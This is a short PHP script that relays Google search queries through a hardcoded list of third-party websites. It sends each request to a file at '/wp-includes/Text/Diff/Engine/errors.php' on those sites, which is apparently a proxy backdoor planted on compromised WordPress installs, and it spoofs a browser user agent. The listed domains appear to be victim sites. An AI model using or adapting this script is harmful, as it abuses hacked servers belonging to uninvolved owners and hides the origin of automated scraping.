<?php
$key = $_GET['q'];
$kiwot = urlencode($key);
$spath = $_GET['start'];
$xpath = $_GET['num'];
$lhost = array("firma.sdyck.de","travelol.ae/booking","w0rld-b.com","peterjwatters.com/blog/travel","elespejodemalleco.cl","loker.pousma.com","architectur.ir","gaziantepiskur.com","obrazovan.bg","uasoinc.org/apogee2020");
$tld = array("com","co.id","co.uk","ae","sg","nl","com.br","co.jp");
$dom = $tld[rand(0,(count($tld)-1))];
$host = $lhost[rand(0,(count($lhost)-1))];
$path = "/wp-includes/Text/Diff/Engine/errors.php?____pgfa=http%3A%2F%2Fwww.google.".$dom."%2Fsearch%3Fq%3D".$kiwot."&num=".$xpath."&start=".$spath;
$uagent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6";
$fp = fsockopen($host, 80, $errno, $errstr, 7);
if (!$fp) {
    echo "$errstr ($errno)<br />\n";
} else {
    $out = "GET $path HTTP/1.1\r\n";
    $out .= "Host: $host\r\n";
    $out .= "Accept: */*\r\n";
    $out .= "User-Agent: $uagent\r\n";
    $out .= "Connection: Close\r\n\r\n";
    fwrite($fp, $out);
    while (!feof($fp)) {
        echo fgets($fp, 128);
    }
    fclose($fp);
}
?>
